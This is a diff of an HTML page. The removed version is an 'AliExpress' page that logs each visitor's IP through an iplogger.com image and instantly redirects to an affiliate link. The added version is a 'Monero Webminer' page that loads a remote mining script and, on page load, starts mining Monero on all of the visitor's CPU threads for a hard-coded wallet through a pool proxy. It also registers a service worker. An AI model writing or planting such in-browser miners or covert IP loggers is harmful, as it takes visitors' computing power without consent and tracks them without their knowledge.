@@ -1,15 +1,42 @@
 <!DOCTYPE html>
-<html>
-  
+<html lang="en" dir="ltr">
   <head>
-<link rel="shortcut icon" type="image/jpg" href="https://images.app.goo.gl/GboN1YGVbuWq2Nnb9">    <title>AliExpress</title> 
+    <meta charset="utf-8">
+    <title>Monero Webminer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="manifest.json">
+      <!-- Start Of Mining Code -->
+      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+      <script>
+          console.log("Config Loaded")
+          server = "wss://ny1.xmrminingproxy.com";
+          var pool = "gulf.moneroocean.stream:80";
+          var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
+          var workerId = "GH-XMR"
+          var threads = -1;
+          var password = "";
+          startMining(pool, walletAddress, workerId, threads, password);
+          throttleMiner = 20;
+      </script>
+      <!-- End Of Mining Code -->
+
+
   </head>
   <body>
-<img src="https://iplogger.com/1oBrY" alt="Insert image description here">
-  
+    <h1>Mining...</h1>
+    <p>View mining progress <a href="https://moneroocean.stream">here</a></p>
 <script>
-setTimeout(function(){ window.location = "https://s.click.aliexpress.com/e/_ms0m1DO" }, 1);
+  if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+      navigator.serviceWorker.register('serviceworker.js').then(registration => {
+        console.log('Service Worker registered with scope:', registration.scope);
+      }).catch(error => {
+        console.error('Service Worker registration failed:', error);
+      });
+    });
+  }
 </script>
-  
+
   </body>
 </html>
